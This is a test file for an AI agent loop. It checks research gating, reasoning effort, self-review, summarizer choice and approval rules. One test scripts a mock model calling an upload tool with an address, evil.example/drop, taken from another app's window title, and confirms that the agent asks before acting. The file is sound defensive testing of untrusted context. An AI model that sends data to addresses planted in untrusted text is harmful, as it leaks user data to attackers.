import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, afterEach, beforeAll, describe, expect, test } from 'vitest'
import { Agent, RESEARCH_FIRST, activityTexts, codingRun, isTaskRun, pickSummarizer, researchGate, runEffort, verifyNote } from '../../src/main/agent/loop'
import { ResultStore, estimate } from '../../src/main/agent/context'
import { ToolRegistry } from '../../src/main/agent/registry'
import { coreTools } from '../../src/main/agent/tools/core'
import type { ToolDef } from '../../src/main/agent/types'
import { Db } from '../../src/main/db'
import { ollamaThink, buildBody } from '../../src/main/llm/client'
import { ACTIVITY_TITLE } from '../../src/main/activity/context'
import type { ChatEvent, ModelInfo, Settings, Thread } from '../../src/shared/types'
import { startMockLlm, type MockLlm } from '../fixtures/mock-llm'

// Smarter bots: research before asking, harder thinking on agent work, a self-review on complex answers,
// and compaction summaries from a stronger model. The verify pass is ON in this file.
delete process.env.FOREMAN_NO_VERIFY
process.env.FOREMAN_NO_AUTOTITLE = '1'

const model = (id: string, tier: 0 | 1 | 2 | 3, extra: Partial<ModelInfo> = {}): ModelInfo =>
  ({ id, provider: 'ollama', providerName: 'Ollama', enabled: true, installed: true, label: id.toUpperCase(), vision: false, tier, requiredGB: 1, maxFittingWindow: 131072, fits: true, ...extra }) as ModelInfo

let llm: MockLlm
beforeAll(async () => { llm = await startMockLlm() })
afterAll(async () => { await llm.close() })
afterEach(() => { llm.script.length = 0; llm.requests.length = 0 })

function harness(models: ModelInfo[], tools: ToolDef[] = [], extra: Partial<Settings> = {}) {
  const db = new Db(':memory:')
  const settings = {
    contextWindow: 32768, taskModels: { voice: '', background: '' }, sampling: {}, thinking: 'medium', advanced: { hardStopsEnabled: true },
    workspaceDir: mkdtempSync(join(tmpdir(), 'ws-')), userName: 'Sam', defaultModel: models[0].id, hiddenModels: [], shownModels: [],
    cloud: { enabled: false, hybrid: false, advisorModel: '', maxConsultsPerRequest: 0 }, customRules: [], ...extra
  } as unknown as Settings
  const results = new ResultStore(mkdtempSync(join(tmpdir(), 'res-')))
  const registry = new ToolRegistry()
  registry.register(...coreTools(results), ...tools)
  const events: ChatEvent[] = []
  const last = { ok: true, models, budgetGB: 32, totalGB: 64, providers: [] }
  const endpoints = { last, for: () => ({ provider: 'custom', baseUrl: llm.url }), usable: () => models, list: async () => last, advisor: () => undefined }
  // Questions and plans are answered right away, as a user would.
  let agent: Agent
  const pendings: ChatEvent[] = []
  agent = new Agent({
    db, results, registry, docsDir: tmpdir(),
    settings: { get: () => settings, keyFor: () => undefined, apiKey: () => undefined } as never,
    endpoints: endpoints as never,
    spaces: { getPrompt: () => '' } as never,
    memory: { block: () => '' } as never,
    emit: (e) => {
      events.push(e)
      if (e.type === 'pending') {
        pendings.push(e)
        const r = e.request
        setTimeout(() => agent.respond(e.threadId, r.id, r.kind === 'questions' ? JSON.stringify(['Q3']) : r.kind === 'plan' ? 'approve' : 'Q3'), 5)
      }
    },
    secretValues: () => [],
    fitWindow: (_m, w) => w,
    counter: () => ({ count: async (t: string) => estimate(t) })
  })
  const space = db.createSpace('Alpha', '#000000')
  const thread = (m: string | null = models[0].id): Thread => db.createThread(space.id, 'auto', m)
  const run = async (t: Thread, text: string, flags: Record<string, unknown> = {}) => (await agent.send({ threadId: t.id, text, ...flags })).done
  return { db, agent, events, pendings, settings, space, thread, run }
}

const look: ToolDef<{ q: string }> = {
  name: 'look', label: 'Look', effect: 'read', description: 'read something',
  parameters: { type: 'object', properties: { q: { type: 'string' } }, required: ['q'], additionalProperties: false },
  async run({ q }) { return { text: `found ${q}` } }
}
const call = (name: string, args: Record<string, unknown>) => ({ name, arguments: JSON.stringify(args) })
const ASK = call('ask_user', { questions: [{ question: 'Which quarter?', options: ['Q3', 'Q4'] }] })
const TASK_TEXT = 'Create a report document about our sales files'

describe('research before asking', () => {
  test('a task that asks before looking gets one "research first" result instead of the card; after research the question shows', async () => {
    const h = harness([model('model-a', 2)], [look])
    llm.script.push({ toolCalls: [ASK], delay: 0 }, { toolCalls: [call('look', { q: 'sales' })], delay: 0 }, { toolCalls: [ASK], delay: 0 }, { content: 'Done.', delay: 0 })
    const t = h.thread()
    expect(await h.run(t, TASK_TEXT)).toBe('finished')
    const tools = h.db.listMessages(t.id).filter((m) => m.role === 'tool' && m.toolName === 'ask_user')
    expect(tools[0].content).toBe(RESEARCH_FIRST)
    expect(tools[1].content).toMatch(/User answered/)
    expect(h.pendings).toHaveLength(1)
  })

  test('asking again right away goes through (a question that is purely the user\'s taste)', async () => {
    const h = harness([model('model-a', 2)], [look])
    llm.script.push({ toolCalls: [ASK], delay: 0 }, { toolCalls: [ASK], delay: 0 }, { content: 'Done.', delay: 0 })
    const t = h.thread()
    expect(await h.run(t, TASK_TEXT)).toBe('finished')
    expect(h.pendings).toHaveLength(1)
    expect(h.db.listMessages(t.id).filter((m) => m.content === RESEARCH_FIRST)).toHaveLength(1)
  })

  test('propose_plan is gated too when Plan first is on', async () => {
    const h = harness([model('model-a', 1)], [look])
    llm.script.push({ toolCalls: [call('propose_plan', { goal: 'Rename', steps: ['a', 'b'] })], delay: 0 }, { toolCalls: [call('look', { q: 'x' })], delay: 0 }, { toolCalls: [call('propose_plan', { goal: 'Rename', steps: ['a', 'b'] })], delay: 0 }, { content: 'Done.', delay: 0 })
    const t = h.thread()
    expect(await h.run(t, 'tidy these', { planFirst: true })).toBe('finished')
    expect(h.db.listMessages(t.id).find((m) => m.role === 'tool' && m.toolName === 'propose_plan')?.content).toBe(RESEARCH_FIRST)
    expect(h.pendings.filter((e) => e.type === 'pending' && e.request.kind === 'plan')).toHaveLength(1)
  })

  test('chat-tier questions and a new bot\'s intro ask right away', async () => {
    const h = harness([model('model-a', 1)], [look])
    llm.script.push({ toolCalls: [call('ask_user', { question: 'Tabby or tuxedo?', options: ['Tabby', 'Tuxedo'] })], delay: 0 }, { content: 'Cute.', delay: 0 })
    const t = h.thread()
    expect(await h.run(t, 'What\'s a good name for my cat?')).toBe('finished')
    expect(h.pendings).toHaveLength(1)
    expect(h.db.listMessages(t.id).some((m) => m.content === RESEARCH_FIRST)).toBe(false)

    llm.script.push({ toolCalls: [call('ask_user', { question: 'What do you want me to focus on?', options: ['Work', 'Something else'] })], delay: 0 }, { content: 'Great.', delay: 0 })
    const t2 = h.thread()
    h.agent.intro(t2.id, '[You were just created as a new bot] Call ask_user.')
    await new Promise((r) => setTimeout(r, 300))
    expect(h.pendings).toHaveLength(2)
  })

  test('researchGate rules', () => {
    const base = { task: true, explored: false, gated: false }
    expect(researchGate('ask_user', base)).toBe(true)
    expect(researchGate('propose_plan', base)).toBe(true)
    expect(researchGate('todo', base)).toBe(false)
    expect(researchGate('ask_user', { ...base, explored: true })).toBe(false)
    expect(researchGate('ask_user', { ...base, gated: true })).toBe(false)
    expect(researchGate('ask_user', { ...base, task: false })).toBe(false)
    expect(researchGate('ask_user', { ...base, unattended: true })).toBe(false)
    expect(researchGate('ask_user', { ...base, intro: true })).toBe(false)
    expect(isTaskRun({ tier: 1 })).toBe(false)
    expect(isTaskRun({ tier: 2 })).toBe(true)
    expect(isTaskRun({ tier: 0, flags: { deepResearch: true } })).toBe(true)
    expect(isTaskRun({ tier: 1, openPlan: true })).toBe(true)
  })
})

describe('thinking effort', () => {
  test('agent tasks think at least High; chat stays adaptive; voice is Low', () => {
    expect(runEffort('medium', { tier: 2, task: true })).toBe('high')
    expect(runEffort('medium', { tier: 3, task: true })).toBe('high')
    expect(runEffort('high', { tier: 3, task: true })).toBe('xhigh')
    expect(runEffort('max', { tier: 2, task: true })).toBe('max')
    expect(runEffort('medium', { tier: 1 })).toBe('low')
    expect(runEffort('medium', { tier: 0 })).toBe('low')
    expect(runEffort('medium', { tier: 2 })).toBe('medium')
    expect(runEffort('low', { tier: 2, task: true })).toBe('medium')
    expect(runEffort('high', { tier: 2, task: true, voice: true })).toBe('low')
    expect(codingRun(['code'], undefined)).toBe(true)
    expect(codingRun(['onshape_part'], undefined)).toBe(true)
    expect(codingRun(['mail'], 'coding')).toBe(true)
    expect(codingRun(['mail'], 'quick question')).toBe(false)
  })

  test('providers map High: gpt-oss thinks high on Ollama and llama.cpp; quick replies still skip thinking', () => {
    expect(ollamaThink('gpt-oss:20b', 'high')).toBe('high')
    expect(ollamaThink('gpt-oss:20b', 'low')).toBe('low')
    expect(ollamaThink('gpt-oss:20b', 'medium')).toBeUndefined()
    expect(ollamaThink('llama3.3:70b', 'high')).toBeUndefined()
    const base = { model: 'gpt-oss:20b', messages: [], sampling: { temperature: 1, top_p: 1, top_k: 0, min_p: 0, presence_penalty: 0, repeat_penalty: 1 }, maxTokens: 100 }
    expect(buildBody({ ...base, baseUrl: 'http://localhost:8080/v1', effort: 'high' }).chat_template_kwargs).toEqual({ reasoning_effort: 'high' })
    expect(buildBody({ ...base, model: 'gpt-5', baseUrl: 'https://api.openai.com/v1', effort: 'high' }).reasoning_effort).toBe('high')
  })
})

describe('self-review', () => {
  test('a hard task gets one hidden check that critiques the draft against the user\'s goal', async () => {
    const h = harness([model('model-a', 3)], [look])
    llm.script.push({ toolCalls: [call('look', { q: 'data' })], delay: 0 }, { content: 'Draft answer.', delay: 0 }, { content: 'Final answer.', delay: 0 })
    const t = h.thread()
    const goal = 'Write a comprehensive, in-depth analysis comparing our three vendors and their trade-offs'
    expect(await h.run(t, goal)).toBe('finished')
    const ms = h.db.listMessages(t.id)
    const check = ms.find((m) => m.role === 'user' && m.meta?.hidden && /Critique your draft/.test(m.content))
    expect(check?.content).toContain('comparing our three vendors')
    expect(ms.filter((m) => m.role === 'user' && m.meta?.hidden && /double-check/.test(m.content))).toHaveLength(1)
    const answers = ms.filter((m) => m.role === 'assistant' && m.kind === 'normal' && m.content)
    expect(answers.find((m) => m.content === 'Draft answer.')?.meta?.superseded).toBe(true)
    expect(answers.at(-1)?.content).toBe('Final answer.')
  })

  test('a change it already looked at gets no second pass; an unchecked one does, and "✓" keeps the answer it wrote', async () => {
    const save: ToolDef<{ v: string }> = {
      name: 'save_note', label: 'Save', effect: 'write_local', description: 'save something',
      parameters: { type: 'object', properties: { v: { type: 'string' } }, required: ['v'], additionalProperties: false },
      async run({ v }) { return { text: `saved ${v}` } }
    }
    const reread: ToolDef<{ q: string }> = { ...look, name: 'file_read' }
    const h = harness([model('model-a', 2)], [save, reread])
    // Saved, then read back: confirmed during the run, so it ends on its first answer.
    llm.script.push({ toolCalls: [call('save_note', { v: 'x' })], delay: 0 }, { toolCalls: [call('file_read', { q: 'x' })], delay: 0 }, { content: 'Saved and checked.', delay: 0 })
    const t = h.thread()
    expect(await h.run(t, 'Save a note that says x in my notes file')).toBe('finished')
    expect(h.db.listMessages(t.id).some((m) => m.meta?.hidden && /double-check/.test(m.content))).toBe(false)
    expect(llm.requests).toHaveLength(3)

    // Saved and not looked at: one check; "✓" keeps the first answer instead of writing it again.
    llm.requests.length = 0
    llm.script.push({ toolCalls: [call('save_note', { v: 'y' })], delay: 0 }, { content: 'Saved y to your notes.', delay: 0 }, { content: '✓', delay: 0 })
    const t2 = h.thread()
    expect(await h.run(t2, 'Save a note that says y in my notes file')).toBe('finished')
    const ms = h.db.listMessages(t2.id)
    expect(ms.filter((m) => m.meta?.hidden && /double-check/.test(m.content))).toHaveLength(1)
    const shown = ms.filter((m) => m.role === 'assistant' && m.kind === 'normal' && m.content && !m.meta?.superseded)
    expect(shown.map((m) => m.content)).toEqual(['Saved y to your notes.'])
    expect(shown[0].meta?.keptDraft).toBe(true)
  })

  test('a message sent while it only double-checks an answer ends that run with the answer and starts a fresh one', async () => {
    const save: ToolDef<{ v: string }> = {
      name: 'save_note', label: 'Save', effect: 'write_local', description: 'save something',
      parameters: { type: 'object', properties: { v: { type: 'string' } }, required: ['v'], additionalProperties: false },
      async run({ v }) { return { text: `saved ${v}` } }
    }
    const h = harness([model('model-a', 2)], [save])
    llm.requests.length = 0
    // The double-check is slow (a word every 400 ms); the user moves on while it runs.
    llm.script.push({ toolCalls: [call('save_note', { v: 'z' })], delay: 0 }, { content: 'Saved z to your notes.', delay: 0 }, { content: 'Let me look at that again more carefully before I answer you here', delay: 400 }, { content: '2 + 2 = 4.', delay: 0 })
    const t = h.thread()
    const done = h.run(t, 'Save a note that says z in my notes file')
    for (let i = 0; i < 100 && !h.events.some((e) => e.type === 'drafting'); i++) await new Promise((r) => setTimeout(r, 20))
    // While it checks, the answer it wrote is still the one on screen (held, marked checking).
    const draft = h.db.listMessages(t.id).find((m) => m.content === 'Saved z to your notes.')!
    expect(draft.meta).toMatchObject({ superseded: true, checking: true })
    await new Promise((r) => setTimeout(r, 600))
    expect(await h.agent.steer(t.id, 'Thanks. What is 2 + 2?')).toBe('sent')
    expect(await done).toBe('finished')
    let ms = h.db.listMessages(t.id)
    expect(ms.find((m) => m.id === draft.id)?.meta).toMatchObject({ superseded: false, checkSkipped: true })
    // The half-written re-check is gone from view; the new message runs as its own request.
    expect(ms.filter((m) => m.role === 'assistant' && m.content.startsWith('Let me look') && !m.meta?.superseded)).toHaveLength(0)
    for (let i = 0; i < 100 && !h.db.listMessages(t.id).some((m) => m.content === '2 + 2 = 4.'); i++) await new Promise((r) => setTimeout(r, 30))
    ms = h.db.listMessages(t.id)
    const asked = ms.find((m) => m.role === 'user' && m.content === 'Thanks. What is 2 + 2?')
    expect(asked?.meta?.steer).toBeFalsy()
    expect(ms.at(-1)?.content).toBe('2 + 2 = 4.')
  })

  test('a double-check that finds a mistake and fixes it is real work: a long fix is never thrown away for the old answer', async () => {
    // Review: run.checking stayed set while the check was fixing, so past 90 s the wrong first answer came back.
    const realNow = Date.now
    let skew = 0
    const save: ToolDef<{ v: string }> = {
      name: 'save_note', label: 'Save', effect: 'write_local', description: 'save something',
      parameters: { type: 'object', properties: { v: { type: 'string' } }, required: ['v'], additionalProperties: false },
      // The fix takes "two minutes".
      async run({ v }) { if (v === 'fixed') skew += 120_000; return { text: `saved ${v}` } }
    }
    const h = harness([model('model-a', 2)], [save])
    Date.now = () => realNow() + skew
    try {
      llm.script.push({ toolCalls: [call('save_note', { v: 'wrong' })], delay: 0 }, { content: 'Saved: total is $313.20.', delay: 0 }, { toolCalls: [call('save_note', { v: 'fixed' })], delay: 0 }, { content: 'Fixed it: the total is $331.20.', delay: 0 })
      const t = h.thread()
      expect(await h.run(t, 'Add up the receipts and save the total in my notes file')).toBe('finished')
      const shown = h.db.listMessages(t.id).filter((m) => m.role === 'assistant' && m.kind === 'normal' && m.content && !m.meta?.superseded)
      expect(shown.map((m) => m.content)).toEqual(['Fixed it: the total is $331.20.'])
    } finally { Date.now = realNow }
  })

  test('pages the agent read in the browser show under its answer as sources', async () => {
    // Grok Bot head-to-head: the trip plan's sources were in the side panel only; browser pages never reached the answer.
    const browse: ToolDef<{ q: string }> = {
      name: 'browse_page', label: 'Browser', effect: 'read', description: 'read a page in the browser',
      parameters: { type: 'object', properties: { q: { type: 'string' } }, required: ['q'], additionalProperties: false },
      async run() { return { text: 'Fairfield Inn Savannah: $260/night', sources: [{ title: 'Fairfield Inn Savannah Downtown', url: 'https://www.marriott.com/savannah' }], read: true } }
    }
    const h = harness([model('model-a', 2)], [browse])
    llm.script.push({ toolCalls: [call('browse_page', { q: 'savannah hotel' })], delay: 0 }, { content: 'The Fairfield Inn is about $260 a night.', delay: 0 })
    const t = h.thread()
    expect(await h.run(t, 'How much is the Fairfield Inn in Savannah per night?')).toBe('finished')
    const answer = h.db.listMessages(t.id).filter((m) => m.role === 'assistant' && m.content && !m.meta?.superseded).at(-1)!
    expect(answer.meta?.sources).toEqual([{ title: 'Fairfield Inn Savannah Downtown', url: 'https://www.marriott.com/savannah' }])
  })

  test('verifyNote: self-review only for complex work', () => {
    expect(verifyNote({ changed: true, researched: false, actions: 2, complex: false })).not.toMatch(/Critique/)
    expect(verifyNote({ changed: false, researched: true, actions: 9, complex: true, goal: 'Plan my trip' })).toMatch(/Critique your draft against what the user asked for \("Plan my trip"\)/)
  })
})

describe('compaction summarizer', () => {
  const big = model('model-big', 3, { rank: 5 })
  test('pickSummarizer: strongest that fits, local first, cloud only when allowed, else the chat\'s own', () => {
    const cur = model('model-a', 2)
    const small = model('model-small', 1)
    const cloud = model('claude-opus-5-5', 3, { provider: 'anthropic', note: 'remote', rank: 9 })
    const win = (m: ModelInfo): number => (m.id === 'model-tiny-window' ? 4096 : 131072)
    expect(pickSummarizer([cur, small, big, cloud], 'model-a', { need: 20000, cloudOk: true, windowOf: win })?.id).toBe('model-big')
    expect(pickSummarizer([cur, small, cloud], 'model-a', { need: 20000, cloudOk: false, windowOf: win })).toBeUndefined()
    expect(pickSummarizer([cur, small, cloud], 'model-a', { need: 20000, cloudOk: true, windowOf: win })?.id).toBe('claude-opus-5-5')
    expect(pickSummarizer([cur, model('model-tiny-window', 3)], 'model-a', { need: 20000, cloudOk: true, windowOf: win })).toBeUndefined()
    expect(pickSummarizer([big, cur], 'model-big', { need: 1000, cloudOk: true, windowOf: win })).toBeUndefined()
    expect(pickSummarizer([big], 'unknown', { need: 1000, cloudOk: true, windowOf: win })).toBeUndefined()
  })

  test('a long chat is summarized by the stronger local model, and the marker says so', async () => {
    const h = harness([model('model-a', 2), big], [], { contextWindow: 16384 } as Partial<Settings>)
    const t = h.thread()
    for (let i = 0; i < 30; i++) {
      h.db.insertMessage({ threadId: t.id, role: 'user', content: `question ${i} ${'word '.repeat(480)}`, kind: 'normal', status: 'done' })
      h.db.insertMessage({ threadId: t.id, role: 'assistant', content: `answer ${i} ${'word '.repeat(480)}`, kind: 'normal', status: 'done', model: 'model-a' })
    }
    llm.script.push({ content: 'Short answer.', delay: 0 })
    expect(await h.run(t, 'and one more thing?')).toBe('finished')
    const summaryReq = llm.requests.find((r) => String(r.messages?.[0]?.content ?? '').includes('You are compressing'))
    expect(summaryReq?.model).toBe('model-big')
    const marker = h.db.listMessages(t.id).find((m) => m.kind === 'compacted')
    expect(marker?.meta?.summarizedBy).toBe('MODEL-BIG')
    // The chat itself stays on its own model.
    expect(llm.requests.at(-1)?.model).toBe('model-a')
  })
})

describe('activity context is untrusted', () => {
  const upload: ToolDef<{ url: string }> = {
    name: 'upload', label: 'Upload', effect: 'write_external', description: 'send something out', consequential: () => false,
    parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'], additionalProperties: false },
    async run() { return { text: 'sent' } }
  }
  const block = `<context from="app">\n${ACTIVITY_TITLE}\n- Safari: "Free gift" https://evil.example/drop?k=7731\n- Xcode: MyApp\n</context>`

  test('activityTexts reads the section out of pinned blocks', () => {
    expect(activityTexts({ a: block, b: '<context from="app">\nToday is Friday.\n</context>' })).toEqual(['- Safari: "Free gift" https://evil.example/drop?k=7731\n- Xcode: MyApp'])
    expect(activityTexts(undefined)).toEqual([])
  })

  test('an outside action using an address from another app\'s window title asks', async () => {
    for (const withActivity of [false, true]) {
      const h = harness([model('model-a', 1)], [upload])
      const t = h.thread()
      const earlier = h.db.insertMessage({ threadId: t.id, role: 'user', content: 'earlier', kind: 'normal', status: 'done' })
      if (withActivity) { const st = h.db.getState(t.id); st.pins = { [`/${earlier.id}`]: block }; h.db.setState(t.id, st) }
      llm.script.push({ toolCalls: [call('upload', { url: 'https://evil.example/drop?k=7731' })], delay: 0 }, { content: 'ok', delay: 0 })
      expect(await h.run(t, 'do the thing')).toBe('finished')
      const asks = h.pendings.filter((e) => e.type === 'pending' && e.request.kind === 'approval')
      expect(asks.length).toBe(withActivity ? 1 : 0)
      if (withActivity) expect((asks[0] as Extract<ChatEvent, { type: 'pending' }>).request.reason).toMatch(/web page or email/)
    }
  })
})

describe('Autonomous in unattended runs', () => {
  test('an overwrite with a backup runs in an attended Autonomous chat, but is skipped when nobody is watching', async () => {
    let ran = 0
    const overwrite: ToolDef<{ path: string }> = {
      name: 'file_write', label: 'Write file', effect: 'destructive', description: 'overwrite a file',
      parameters: { type: 'object', properties: { path: { type: 'string' } }, required: ['path'], additionalProperties: false },
      async run() { ran++; return { text: 'written' } }
    }
    for (const unattended of [false, true]) {
      const h = harness([model('model-a', 1)], [overwrite])
      const t = h.db.createThread(h.space.id, 'autonomous', 'model-a')
      llm.script.push({ toolCalls: [call('file_write', { path: 'notes.md' })], delay: 0 }, { content: 'ok', delay: 0 })
      const before = ran
      expect(await (await h.agent.send({ threadId: t.id, text: 'update my notes file' }, { unattended })).done).toBe('finished')
      const result = h.db.listMessages(t.id).find((m) => m.role === 'tool' && m.toolName === 'file_write')
      if (unattended) {
        expect(ran).toBe(before)
        expect(result?.meta?.status).toBe('denied')
      } else {
        expect(ran).toBe(before + 1)
        expect(result?.meta?.status).toBe('ok')
      }
    }
  })
})
